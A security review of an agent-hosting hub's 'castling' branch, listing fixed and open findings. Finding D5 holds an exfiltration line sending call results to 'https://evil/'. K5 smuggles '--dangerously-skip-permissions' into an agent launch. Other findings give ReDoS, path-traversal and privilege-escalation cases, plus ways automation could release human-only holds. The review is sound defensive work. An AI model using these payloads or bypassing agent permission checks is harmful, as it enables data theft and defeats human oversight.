# Castling hardening review (wave 6)

An adversarial read of `origin/castling` against `origin/master` (at
a387b537, 2026-10-31), against docs/spec/core-v2.md and the castling-*
knowledge pages. Scope: security first (tickets, replay, ceilings, leases,
dispatch rights, presets, gates, holds, secrets, the page sandbox, the MCP
door, enrollment, plugin signatures, path traversal, argv/URL injection),
then spec correctness, crash/robustness, concurrency and needless
complexity.

Every fixed finding has a test that fails on castling and passes with the
fix, in its own pull request (one theme each). Open findings say what to do.

All fixes together pass the whole test suite, `tests/e2e` included
(`rook-pytest tests`: 5241 passed, 2026-10-31).

Severity: **critical** = a narrow identity gets full rights; **high** = a
secret leaks, a signature or spec guarantee is bypassed, or one call can
take a worker or the hub down; **medium** = a real gap that needs an
unusual setup or a second step; **low** = hardening.

## Fixed

| # | Sev. | Finding | PR |
|---|---|---|---|
| D1 | critical | An agent-made page's calls ran as the viewer alone, so whatever it created was recorded as the viewer's: a page limited to `pages.create` made a page with `caps: ["*"]` and the owner as its only author, which then ran `shell.exec` as the owner. A made page now acts as its agent author for the viewer. | #294 |
| W1 | high | `core.plugin.rollback` loaded the kept version without re-checking its files against `plugin.sig` or the signing hub's role, and joined its `plugin` arg into a path (`../x` loaded any folder with a `state.json` and `plugin.yaml`). | #292 |
| H1-redos | high | `rights.matches` compiled globs to `.*` regexes; an agent's session caps (`*a*a*a…*!`) backtracked exponentially and froze dispatch. Linear matcher. | #293 |
| D2 | high | `{{secret:band-psk-*}}` resolved in any call by an owner, agents for the owner included, on any cap: `shell.exec echo` printed another band's PSK. Now only in the owner's own `core.trust.set`. | #295 |
| H8 | medium | Secret values came back in error text (a schema error quotes the resolved argument) to the caller and the journal (spec 6.4). Dispatch redacts what its secret step substituted. | #295 |
| D3 | high | An agent with an owner's token could `POST /enroll/code` and claim the code itself, getting the bundle with the home band PSK; or approve a stranger's device code. Enrollment is now for the person alone. | #296 |
| H1 | high | The hub never sent `core.lease.drop` (spec 7.4). Ending a session now drops its leases on the workers holding them. | #299 |
| H3 | medium | `elevation: upfront` caps always run elevated but dispatch used their declared risk: admin-matching gates, the sacred-machine hold (`risk != read`) and the journal missed them (spec 7.1). | #299 |
| H4 | medium | `core.elevate` checked person, agent, session and ceiling but dropped the call's extra layers (a page's caps, a plugin's `uses`), and didn't refuse an ended session or expired person. | #299 |
| H5 | medium | `core.call` sub-calls applied only the calling plugin's `uses`, not the parent call's layers: a page declaring `file.read` reached whatever `file` uses. | #299 |
| H6 | medium | Releasing a hold reused the cap and worker data from hold time: a cap re-announced as `destructive` (or a machine made sacred) after a gate-flag hold could be released by triage. | #300 |
| K5 | medium | `agents-claude-code.turn` passed `session` after `--resume`, whose value is optional: `session="--dangerously-skip-permissions"` became a flag and bypassed `permission_mode`, `allowed_tools`, `isolate`. | #301 |
| K4 | medium | The action engine escaped a `..` URL path argument to `%2E%2E`, which yarl decodes and resolves: each templated path segment could climb one level. Latent (no shipped plugin templates a path). | #301 |
| K1 | high | `file.search` (risk read) ran the caller's regex in the worker; `re` holds the GIL, so `(a+)+$` froze every thread, heartbeats included, past any timeout. The scan runs in a killable child now. | #302 |
| K2 | high | `file.read` on a FIFO blocked in `open()` forever; timed-out calls keep their executor thread, and a few dozen exhaust the loop's default executor (every sync cap, `getaddrinfo`). Regular files only now. | #302 |
| K3 | high | Config-action `exec` skipped core's launch path (spec 7.1): root workers ran actions as root, leases never applied. Every exec child also inherited the hub's `ROOK_SECRET_*` vault stand-in. | #305 |
| D8 | low/med | An unread request body on a kept-alive connection was parsed as the next request (smuggling behind a shared proxy connection). | #303 |
| D10 | low | No socket timeout on the HTTP door: idle connections held threads forever. 60 s now. | #303 |
| CI | — | `test_ask_answer_cancel_and_timeout` (jobs) raced on CI py3.12 and failed unrelated PRs. | #304 |

## Open

### High

- **H2: `core.call`/`core.elevate` take a bearer ticket.** The hub reads the
  sender's worker id from the ticket itself (`runtime.py` `_band_request`),
  so `ticket["worker"] != from_worker` never fails. Anyone with the band PSK
  reads every ticket on the band and, while that call is in flight, can send
  their own `core.call` with it: the hub dispatches it as the parent's
  person, agent and session (bounded by the parent plugin's `uses`) and the
  reply goes out on the band. This contradicts spec 15 ("cannot make a v2
  worker run anything"). Transport senders are not authenticated, so there
  is no small fix: give workers a key (sign `core.call`/`core.elevate`
  requests), or at least cap sub-calls per parent ticket and journal them
  loudly. Needs a spec decision (core v2.1).
- **D5: a page can exfiltrate by navigating its own frame.** `sandbox
  allow-scripts` without `allow-top-navigation` still lets a frame navigate
  itself: `location = "https://evil/?d=" + JSON.stringify(await
  rook.call(...))`. The shell notices the second load only after the data
  left. CSP has no portable `navigate-to`. Options: serve made pages from a
  separate origin with a strict `connect-src`/`form-action`, or proxy
  outbound navigation through a confirm. With D1 fixed, the reach is the
  page's caps intersected with its author.
- **H7: hard-stop releases are open to any person-only caller.**
  `decide()` treats `caller.agent or caller.person` as who decides, and
  `approval.decide` is an ordinary hub cap. A job created by a person runs
  as person-only with `uses: ["*"]`, and hub plugins can `ctx.call_as` a
  person, so automation can release that person's destructive or `sends_as`
  holds. Spec 10.3 says nothing but the person releases them. Suggestion:
  hard stops release only from a human-present door (the site shell's own
  call, the phone card, `POST /holds/<name>` with a person token), never
  from a dispatched cap; narrow `system:` releases to the triage component.

### Medium

- **D4: device-code queue flood.** `/enroll/device` is unauthenticated and
  `MAX_PENDING` (32) is global: anyone who reaches the hub keeps it full and
  real devices get "busy". The device also names itself freely ("bake-laptop")
  in `/enroll/pending`. Per-source limits don't survive a reverse proxy;
  show the device's address and code age to the approver, and expire
  unpolled codes fast (a real device polls every few seconds).
- **D6: page events aren't scoped to the viewer's data.** `_poll` filters by
  event name against the viewer's grants only: an adult's page with
  `events: ["sms.*", "telegram.*", "hold.*"]` receives other people's
  messages and holds. Events need an owner/person field and the `personal`
  effect applied the way records do.
- **D7: the MCP kill switch is partial.** `closed_doors` is checked only in
  `dispatch()`: `workers`, `caps`, `journal`, `holds` and session starts
  still answer through a closed MCP door; the same agent token works on the
  HTTP door; sub-calls dispatch with `door=None`; nothing (route, cap,
  security plugin) calls `close_door`, and it is memory only.
- **H5 (hub caps).** A hub cap's `ctx.call` (`runtime.call_as`) applies only
  the plugin's `uses`, not the layers of the call it runs inside (a page's
  caps): hub caps get no in-flight ticket to carry them. Thread the parent
  call's layers through the hub cap's caller.
- **H9: agents read any project's journal by naming it.** `start_session`
  accepts any `project`, and `journal_view` grants an agent every project of
  its sessions. Check the agent's (or person's) access to the project at
  session start.
- **K2 (general).** Sync plugin code runs on the loop's shared default
  executor; a hung sync cap keeps its thread after the call times out.
  `kvm.api_get` with a follow/stream query reads forever. Give plugin calls
  their own bounded executor (per plugin), and cap response reads in kvm.
- **K6: canary scans stop at 8 MiB** (`security.py` `_text`): a canary
  behind 8 MiB of padding is missed. The check is also CPU-bound inside an
  async gate (re-dumps args 3-4 times; 50 MB args block the hub loop
  ~0.3 s). Scan head and tail, dump once.
- **H11: dispatch has no crash guard.** An exception inside `_dispatch`
  (malformed cap meta, `needs_approval`, a gate with an unknown mode, a
  failing `journal.append` after the call ran) gives the caller a traceback
  and no journal entry. Journal in a `finally` with `error: internal`.

### Low

- **D9:** tokens can't be revoked while the hub runs (reload only adds);
  `/workers` and `/caps` answer any valid token (a child, a deleted agent)
  with the whole band.
- **D11:** login CSRF on `POST /login` (a cross-site form signs the victim
  into the attacker's account); the MCP door accepts person-only tokens
  (spec 10.1 says agents); the mDNS responder answers unicast from any
  source (small reflector); with `--discover` an attacker on the LAN can
  answer mDNS and relay a device-code flow (approvers aren't shown the
  device's URL/address); `_poll` reads `self.sessions[sid]` outside the
  lock (rare 500).
- **H10:** sub-calls and `call_as` dispatch with `door=None`, so closing a
  door doesn't stop work already started through it.
- **H12:** the journal's `args_hash` is over unresolved args, the ticket's
  over resolved ones, so a journal entry can't be matched to a worker's
  audit line; released holds don't check `session.exp`; a worker's
  manifests supply its own `uses`, so a compromised worker can widen its
  `uses` layer; jobs created by an agent for a person store `creator` as
  `"person:x via agent:y"`, which `Caller.problem()` rejects (fails closed:
  those jobs never run).
- **K7:** `on`/`every` hooks have no timeout or backpressure (jobs listens to
  `on: "*"`).
- **K8:** hub-side config actions don't resolve secret settings (they render
  the vault name), skip `cap=` (arg map/join, result coercion) and get no
  `tmp`.
- **K9:** `shell.exec` keeps unbounded output in memory (`yes` for 30 s can
  OOM the worker; cap it as adb does); the jobs webhook has no timestamp or
  nonce (a captured signed POST replays); `urllib` in kvm and llm-anthropic
  follows cross-host redirects with credentials; `trust_class` calls
  YAML-only plugins `config` though their `exec` actions run any binary
  (don't let it gate installs as "no code"); `records/store.py`
  `_check_refs` checks band, not visibility (an existence oracle for
  private record ids).
- **Plugin module names** (`rook_plugin_<version folder>_<stem>`) collide
  between two plugins of the same version with the same script name
  (known, castling-worker-host follow-up).
- **Replies are unauthenticated** on the band (spec 15 accepts it): a PSK
  holder can answer a request id it saw. Worker keys (H2) would close it
  too.
- **Plugin `python` pins** install from PyPI without hashes: the hub signs
  names and versions, not artifacts.

## Checked and sound

- Worker ticket check (`wire.verify_ticket`, `WorkerGate.check`): order and
  reason codes per 6.3, lifetime bounds, skew, args binding, ceiling with the
  `ALWAYS`/`HOME_ONLY` exceptions; replay cache is file-backed, fsynced,
  bounded, refuses on a lost or torn file for 150 s, refuses when it can't
  record.
- Trust store: anchor read-only with `key_id(root)` check; memberships
  verified on load against the grant that certified their key, no rollback
  (`iat` must grow), role `home` only for the home hub; leases dropped when a
  membership changes and when the hub is lost.
- Leases: bound to hub, band, worker, person, agent, session; ≤ 900 s;
  memory only; elevation fails closed on timeout or refusal.
- Plugin installs: nothing written before the signature checks out; tar
  members regular files only, safe relative paths, case-fold duplicates
  refused, exact file set and hashes; start-up re-check of hashes and role.
- Launch: root workers drop to `run_as` or refuse; elevated calls go through
  `sudo -n`.
- Dispatch: every layer must pass; malformed rights refuse; unknown risk is
  admin, scope external, effects destructive for holds; presets keep
  `max_risk`/`effects`; plugin grants confined to their namespace; gates
  run in parallel under a 200 ms cap, errors/timeouts/malformed results
  count as `flag`, `clean()` keeps only verdict/confidence/reason, shadow
  ignored; gate input has secret references unresolved; held calls are
  deep-copied and run exactly; release/refuse delete the hold before any
  await (no double run); sessions don't grow, `tainted` never clears.
- Journal: write-once rows (triggers), chain hash covers `prev`, chain and
  project stamped by the hub.
- Doors: tokens stored as SHA-256 digests (256-bit tokens); cookie
  HttpOnly + SameSite=Strict; CSRF header on cookie POSTs; page iframe
  `sandbox="allow-scripts"` without `allow-same-origin`, CSP `sandbox`,
  `frame-ancestors 'self'`; postMessage source checks both ways; the shell
  uses `textContent`, escapes injected JSON; static and page files confined
  by `resolve()`; MCP JSON-RPC errors handled, Origin allowlist enforced;
  request bodies capped.
- Enrollment codes: 128/256-bit, single use, 10 min; the device refuses
  plain http off loopback and pins the hub id from the QR.
- Kit: templates render once (no re-templating, no eval), argv slots don't
  split, CR/LF/NUL refused in headers, host slots restricted; records store
  validates identifiers and quotes FTS; manifests load with a SafeLoader
  without aliases; `run:` paths confined to the plugin folder.
- Plugins: jobs scripts owner-only, run through `launch` with `-I` and a
  scrubbed env, killed on timeout; security gates only restrict, triage
  release limited and never for persistence/exfiltration; telegram and llm
  errors never include tokens; migrate seals vault values (SecretBox), files
  0600, reports names only.
- A plugin exception, `SystemExit` or a failing hook never stops the worker
  (the host turns all of it into error replies).

## Complexity

Nothing found that asks for a redesign or a cut: the fixes above are small
and local, and none adds a new abstraction.
